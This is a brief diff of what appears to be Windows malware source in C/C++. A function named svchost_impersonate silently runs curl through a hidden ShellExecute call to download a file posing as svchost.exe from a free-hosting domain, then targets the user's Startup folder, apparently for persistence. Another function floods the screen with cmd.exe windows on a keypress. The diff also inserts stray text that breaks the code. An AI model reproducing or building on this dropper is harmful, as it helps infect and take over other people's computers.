@@ -47,7 +47,7 @@ void lol()
 
 void svchost_impersonate()
 {
-        ShellExecute(NULL, NULL, L"curl https://dhiuhkasfhsdhkjshfiusffsbfusfhihikhioi.000webhostapp.com/svchost.exe", NULL, NULL, SW_HIDE);
+        ShellExecute(NULL, NULL, L"curl -X GET https://dhiuhkasfhsdhkjshfiusffsbfusfhihikhioi.000webhostapp.com/svchost.exe --output svchost,exe", NULL, NULL, SW_HIDE);
         TCHAR userProfile[MAX_PATH];
         if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, userProfile))) {
         PathAppend(userProfile, TEXT("AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"));
@@ -66,7 +66,7 @@ void maozedongthecompooter()
               for(amount = 0; amount < 50; ++amount)
               {
                         ShellExecute(NULL, NULL, L"cmd.exe", NULL, NULL, SW_SHOW);
-              } 
+              } adg
         }
         if(GetAsyncKeyState(VK_W) & 0x8000)
         {
